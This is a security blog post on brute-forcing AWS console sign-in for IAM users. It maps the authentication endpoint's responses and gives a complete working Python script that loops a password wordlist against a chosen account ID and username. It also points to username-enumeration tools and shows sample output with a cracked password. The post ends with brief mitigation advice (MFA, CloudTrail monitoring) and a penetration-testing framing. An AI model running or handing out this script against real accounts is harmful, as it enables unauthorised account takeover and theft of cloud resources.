---
title: How to brutefore AWS console sign-in
author: Naikordian
date: 2021-09-15 10:34:00 -0500
categories: [Reseach,Cloud]
tags: [AWS]
---

## Introduction
I saw some vendors have a detection rule about AWS Console brute force login and I was curious if there any AWS console brute force tool. So I start google but found nothing and I think there should be a way to brute force.

## How does console sign in work?
When you click "Sign in" the console will send login data to https://signin.aws.amazon.com/authenticate and return a response
 
if the user enable MFA:
```json
{"state":"SUCCESS","properties":{"result":"MFA","mfaType":"SW","header":"Multi-factor Authentication","cancelLink":"https://console.aws.amazon.com/console/home?fromtb\u003dtrue\u0026hashArgs\u003d%23\u0026state\u003dhashArgsFromTB_us-east-1_4301e3df13c998fe","text":"Enter an MFA code to complete sign-in."}}
```
Login success:
```json
{"state":"SUCCESS","properties":{"result":"SUCCESS","redirectUrl":"https://console.aws.amazon.com/console/home?code\u003RUYiLCJlbmMiOiJ.....................................................YXgvJagvR8sF7w"}}
```
 Incorrect username/password:
```json
{"state":"FAIL","properties":{"result":"FAILURE","text":"Your authentication information is incorrect. Please try again."}}
```
Missing some header:
```html
There seems to be a problem with your session. Or you are trying to access an AWS region that is not enabled for your account. <br />
 If the problem persists try clearing your browser cookies or <a href="https://console.aws.amazon.com/iam/home?region=us-east-1" target="_blank">sign in into the US East region</a>.
We apologize for the inconvenience.<br />
```
Missing some POST data :
```json
{"state":"FAIL","properties":{"Message":"Invalid request","Title":"Bad Request","header":"Bad Request","text":"Invalid request"}}
```

So I remove unnecessary parameters the request will look like this :


```python
import requests

headers = {
    'Referer': 'https://signin.aws.amazon.com/oauth?client_id=arn%3Aaws%3Asignin%3A%3A%3Aconsole%2Fcanvas&code_challenge=HX2l8ZYWg_5-bz_ed-RChnM-GNqJFbWBiDBbtq1-HVQ&code_challenge_method=SHA-256&response_type=code&redirect_uri=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Ffromtb%3Dtrue%26hashArgs%3D%2523%26isauthcode%3Dtrue%26state%3DhashArgsFromTB_us-east-1_5674597973dd3cd0&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJGMEQCIFTWCIdWxMlnFxwHYxlpNxADKYyFjHxvuQqbiITcIZguAiB3o%2FsGsv9UbgQWi8UWH5r%2FgBHNK4%2FIaYM0brhqI%2BcpzyqTAgiD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAEaDDM1ODgyMTg4MDU2NSIMAtX%2BUfkVugJIEPKoKucBprpcJ0aOyAwP%2FHCPbyTIR1HkK%2F1XdC2dh2cdoPBpkSu%2FXgSLjtuRat4ZoPpIN9PtFCU8zYVhWhf%2BMRThkEDK1tUx8zwjPoE%2B%2BfwkBhBNXGmeptTDfprZ7LosegbiJe86zT8o3VOv4%2FE0tmJHcnSrsbEhM87AikUQvobKY6Lr4JlqU7MM3uuU6pxf7Vz1sagypCfcj%2FSKPlOqsFzmGyFpd9W4KNN%2BWceq9rGLmvHUbKOnN64I73uxWVH%2Bsj10CKgCfw060zjKHfZj41KcNvAazr7HyjT8Qmj1AjsmVw12hc4kobOh6zF8MM6G6oYGOpABiohVmFhrhpvVbITOoSePH7jdiC4my%2B60vDPkj5Av4Euz2Jdb2svTXMRXH82CQkhBl9EhflGz%2BMEp3n2AeJ4ySIajogQPrN0AqGDTQVxxhjcQ24%2F6ueSUC0MsL9irM2tt2Hm%2BHLsZ9zIFF7wSCWtBVVGJsYbcCL659kAWrWuFhXRiofBN7cRvyUZSqO83J2zA&X-Amz-Date=20210629T022227Z&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAVHC3TML2YHA5VWS4%2F20210629%2Fus-east-1%2Fsignin%2Faws4_request&X-Amz-SignedHeaders=host&X-Amz-Signature=11d78bf1043164b982b04e82f0c33a5866bc35cc70e53da3c6d8353ba525719d',
}

data = {
  'action': 'iam-user-authentication',
  'account': '123456789012',
  'username': 'console_user',
  'password': 'password',
  'client_id': 'arn:aws:signin:::console/canvas',
  'redirect_uri': 'https://console.aws.amazon.com/console/home',
}

response = requests.post('https://signin.aws.amazon.com/authenticate', headers=headers, cookies=cookies, data=data)
```
The referer header has an AWS credential that got from the sign-in page but you can just remove GET parameters the request still works. 
so the final playload will look like this:
```python
import requests

headers = {
    'Referer': 'https://signin.aws.amazon.com',
}

data = {
  'action': 'iam-user-authentication',
  'account': '123456789012',
  'username': 'console_user',
  'password': 'password',
  'client_id': 'arn:aws:signin:::console/canvas',
  'redirect_uri': 'https://console.aws.amazon.com/console/home',
}

response = requests.post('https://signin.aws.amazon.com/authenticate', headers=headers, data=data)
print(response.text)

```
##  Where to find usernames?
You can use a Rhino Security Labs' research [Using AWS Account ID’s for IAM User](https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/) or Pacu module `iam__enum_users` to enumerate usernames.

## Brute force password

### Requirements
- AWS account id
- Console username
- Password wordlist

### Prepare a wordlist
if you have a permission `iam:GetAccountPasswordPolicy` or you already know the target account's password policy you should follow that policy
but if you don't I recommend using the default policy as a guideline.

The default user password policy:
-   Minimum password length is 8 characters
-   Include a minimum of three of the following mix of character types: uppercase, lowercase, numbers, and ! @ # $ % ^ & * ( ) _ + - = [ ] { } | '
-   Must not be identical to your AWS account name or email address

If you want to make sure the wordlist cover all password as possible you can use this

The weakest possible password policy:
-   Minimum password length is 6 characters

### Brute force script

```python
#!/usr/bin/python3
import argparse
import requests

headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'referer': 'https://signin.aws.amazon.com',
}

data = {
  'action': 'iam-user-authentication',
  'account': '123456789012',
  'username': 'console_user',
  'password': 'password',
  'client_id': 'arn:aws:signin:::console/canvas',
  'redirect_uri': 'https://console.aws.amazon.com/console/home',
}


requests.urllib3.disable_warnings()

parser = argparse.ArgumentParser()
parser.add_argument('--account-id','-id', required=True, default=False, metavar='account_id', type=str)
parser.add_argument('--username','-u', required=True, default=False, metavar='username', type=str)
parser.add_argument('--wordlist','-w', required=True, default=False, metavar='file_path', type=str)
args = parser.parse_args()

if __name__ == '__main__':
    data['account'] = args.account_id
    data['username'] = args.username
    passwords = open(args.wordlist).read().splitlines()
    for password in passwords:
        data['password'] = password
        response = requests.post(
                'https://signin.aws.amazon.com/authenticate',
                headers=headers,
                data=data,
                verify=False
                )
        if '"result":"SUCCESS"' in response.text:
            print(response.text)
            print("="*20)
            print("Passwrod: ", password)
            break
```
Usage:
```console
./poc.py -id 0123456789012 -u console_user -w passwords.txt
{"state":"SUCCESS","properties":{"result":"SUCCESS","redirectUrl":"https://console.aws.amazon.com/console/home?code\ueyJ6a........................0EqLmrg"}}
====================
Passwrod:  Brut3f0r3_P@ssw0rd
```
## Mitigation
I recommend enabling MFA for all console users. You can also monitor Cloudtrail log eventName: `ConsoleLogin` if you see a lot fail login attempts in a short period and see login success from the same IP maybe someone got into your account.
## Conclusion
This technique combined with a Rhino Security Labs' research[1] could be useful when you perform penetration testing AWS accounts and demonstrate how important MFA and strong password policy are necessary to make your AWS account secure.


[1]: https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/